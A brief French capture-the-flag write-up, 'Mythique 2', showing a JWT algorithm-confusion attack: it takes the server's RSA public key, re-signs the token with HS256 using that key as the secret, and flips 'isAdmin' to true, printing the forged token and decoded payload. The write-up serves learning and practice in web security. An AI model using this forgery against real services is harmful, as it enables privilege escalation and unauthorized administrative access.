## Mythique 2

première étape récupérer la clé publique

```KEY
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqLkYHUSPJYmg4LcJIFKD
5An8sSdOXNUftIyEsHFbmQGK/nQvHjdUE0UlJlUeg0rpfllqZqaqe+ScImvdNsu5
X+KlOKgSg4xLeqiToDEIoU1vAU2D11gMWn+1e8Ht9l+T47c09rbZKuTYXGsy02tw
hJkdQ7KeuwMmMuXCVsE5dZUF6pgjRW9M5PVpEW9nWqTOqCsrK7EVxursCUAd+hvN
tTh4y+la9eDG7djDs1QQBwmnNzFeK6I6YSVMeLcsttxGi5lMQyc/iGkNSVtblxoq
jOFlxkOl1C9gpyuD7ECCLrcBvipdjDi6n5s8/3NTLxM2o9KCMWcQ4vMr+UNWQq6k
YQIDAQAB
-----END PUBLIC KEY-----

```

Récupérer le JWT et on va utiliser le vecteur d'attaque de changement de signature. Nous allons passer de RS256 à H256 et utiliser la clé publique pour générer notre propre signature.
On modifie le token pour mettre **isAdmin** à true

```JWT
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NzEyNzg2NDMsImRhdGEiOnsibmFtZSI6IlpvYiDDgCBQb2lsIiwiaXNBZG1pbiI6dHJ1ZX0sImlhdCI6MTY3MTI3NTA0M30.CkWsbhdomgdUdy-xFiH0DFn16yBeZ8c656_OcvJMabU
```

On récupère ce token avec les informations suivantes
```JSON
{
  "exp": 1671278643,
  "data": {
    "name": "Zob À Poil",
    "isAdmin": true
  },
  "iat": 1671275043
}
```
